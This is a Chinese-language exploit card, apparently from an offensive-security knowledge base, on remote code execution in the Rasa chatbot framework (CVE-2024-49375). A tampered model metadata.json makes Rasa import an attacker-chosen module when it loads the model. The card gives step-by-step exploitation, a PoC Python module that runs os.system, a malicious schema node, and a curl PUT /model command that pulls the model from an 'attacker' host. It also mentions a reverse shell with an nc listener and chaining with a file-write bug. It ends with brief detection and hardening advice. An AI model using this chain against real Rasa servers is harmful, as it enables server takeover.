---
id: web-python-framework-rasa-model-metadata-importlib-rce
title: Rasa 恶意模型 metadata.json 图 schema 动态导入导致 RCE
type: scenario
domain: web
path: web/python/framework
technique: model-metadata-importlib-rce
tags:
- python
- rasa
- importlib
- model-loading
- deserialization
- rce
- chatbot
- cve-2024-49375
cve:
- CVE-2024-49375
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: 原文称 3.6.21 已修复，但作者在 Rasa 3.6.21 复现成功（标记冲突）
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:51:32+08:00'
  notes: 已对照原文与截图 38-52、57-60 核对：LocalModelStorage.from_model_archive→TarSafe 解压→_load_metadata→GraphSchema.from_dict 遍历 nodes[*].uses→class_from_module_path→importlib.import_module，篡改 metadata.json 指向 pwnmod.Pwn 后加载模型触发模块顶层代码，反弹 shell 成功（whoami=rasa）；未验证点：NVD 称 CVE-2024-49375 在 3.6.21 修复而作者在 3.6.21 复现，存版本冲突（卡内已标注），CVE 与本文 importlib 向量是否同一漏洞未能独立确认
url: /docs/web/python/framework/web-python-framework-rasa-model-metadata-importlib-rce/
draft: false
kb_aliases:
- Rasa RCE
- CVE-2024-49375
- metadata.json 动态导入
- GraphSchema uses importlib
- predict_schema 代码执行
---

## 一句话结论

Rasa 加载模型时会读取 `metadata.json` 中的 `predict_schema`，对每个节点的 `uses` 字段调用 `class_from_module_path()`；该函数用 `importlib.import_module()` 导入攻击者指定的模块，导入即执行模块顶层代码，因此上传/加载一个篡改过 metadata 的模型即可远程代码执行。

## 原理

- `/model` 加载模型后，`Agent.load_model()` 创建新的 `MessageProcessor`，其 `__init__` 调用 `_load_model()`。
- `_load_model()` 把模型 tar 交给 `loader.load_predict_graph_runner(temp_dir, Path(model_tar), LocalModelStorage, DaskGraphRunner)`。
- `LocalModelStorage.from_model_archive()` 先用 `TarSafe` 解压（阻止 tar 路径穿越），把 `components/*` 移入存储目录，然后 `_load_metadata(temp_dir)` 读取 `metadata.json`。
- `ModelMetadata.from_dict()` 对 `train_schema`、`predict_schema` 调用 `GraphSchema.from_dict()`。
- `GraphSchema.from_dict()` 遍历 `serialized_graph_schema["nodes"]`，对每个节点的 `uses` 执行：
  ```python
  serialized_node["uses"] = rasa.shared.utils.common.class_from_module_path(
      serialized_node["uses"]
  )
  ```
- `class_from_module_path()` 的逻辑：
  ```python
  if "." in module_path:
      module_name, _, class_name = module_path.rpartition(".")
      m = importlib.import_module(module_name)
  ```
  `importlib.import_module("pwnmod")` 等价于 `import pwnmod`，会立即执行该模块的顶层语句和类体语句。攻击者只需让 `uses` 指向一个已存在于 `sys.path`（如 Rasa 进程 cwd `/app`）的恶意模块，模型加载即触发代码执行。
- 模块本身可以通过同产品的任意文件写入缺陷（`filename` 路径穿越）先落到 `/app`，形成“任意写 + 恶意模型加载 = RCE”的完整链。

## 触发条件

- Rasa 以 `--enable-api` 启动，`/model` 可达（未授权即可；有鉴权时需要有效 Token/JWT）。
- 攻击者能提供模型 tar（通过 `model_server`、`remote_storage` 或可控的 `model_file` 路径）。
- 恶意模块已存在于 Rasa 进程可导入的路径（cwd、`PYTHONPATH`、site-packages）。
- 模型 tar 解压目录为空（`from_model_archive()` 会拒绝非空存储目录）。

## 利用步骤

1. 取一个正常训练出的模型 tar.gz，解开后编辑 `metadata.json`，在 `predict_schema.nodes` 中新增一个节点，把 `uses` 指向恶意模块的类，例如 `"uses": "pwnmod.Pwn"`。
2. 将恶意模块 `pwnmod.py` 放到 Rasa 进程 cwd 或 `sys.path` 可导入的位置；可用任意文件写入缺陷直接写入 `/app/pwnmod.py`。
3. 重新打包模型 tar.gz，用伪造模型服务器提供该文件，并返回 `ETag` 让 `_pull_model_and_fingerprint()` 认为有新模型。
4. 发送 `PUT /model`，`model_server.url` 指向伪造服务器；Rasa 拉取并加载模型，`GraphSchema.from_dict()` 触发 `import pwnmod`。
5. 模块顶层代码执行（如反弹 shell），在攻击机监听端口获取会话。

## PoC

恶意模块（顶层代码在 import 时执行）：

```python
# pwnmod.py
import os
os.system("id > /tmp/rasa_pwn")

class Pwn:
    @classmethod
    def load(cls):
        return cls()
```

`metadata.json` 中新增的节点（放在 `predict_schema.nodes` 下）：

```json
"pwn_import": {
  "needs": {},
  "uses": "pwnmod.Pwn",
  "constructor_name": "load",
  "fn": "provide",
  "config": {},
  "eager": true,
  "is_target": false,
  "is_input": false,
  "resource": null
}
```

加载恶意模型：

```bash
curl -X PUT http://target:5005/model \
  -H 'Content-Type: application/json' \
  -d '{"model_server":{"url":"http://attacker:8000/model","wait_time_between_pulls":0}}'
```

验证：目标机上出现 `/tmp/rasa_pwn`；若模块写的是反弹 shell，则在攻击机 `nc -lvp 8889` 收到会话。

## 变体与关联

- 变体：`train_schema` 同样经过 `GraphSchema.from_dict()`，可改 `train_schema` 达到相同效果。
- 变体：`uses` 也可指向任何可导入的标准库/第三方模块中的类，导入副作用即触发点；不要求模块由攻击者上传，但可控模块最直接。
- 关联：模块落地可复用 `filename` 路径穿越任意文件写入；模型投递可复用未授权 `/model` 接口。
- 关联卡片：[[web-python-framework-rasa-model-server-filename-path-traversal]]、[[web-python-framework-rasa-malicious-model-dialogue-hijack]]

## 检测与防御

- 检测：`/model` 请求指向外部 `model_server`；Rasa 进程加载模型后出现异常 `import`、子进程、外连。
- 检测：模型 tar 内 `metadata.json` 的 `nodes[*].uses` 指向非 Rasa 自身命名空间的模块（如 `pwnmod.Pwn`、`os.system` 之类）。
- 检测：模型加载阶段（非对话阶段）出现 `os.system`/`subprocess`/socket 行为，属于高置信告警。
- 修复：对 `uses` 做白名单校验（只允许 Rasa 内置组件类），禁止任意 `importlib.import_module()`；升级到包含修复的版本。
- 加固：`/model` 强制鉴权、限制模型来源；模型文件做签名/完整性校验；Rasa 运行在只读文件系统、低权限容器中，cwd 不放可写模块。
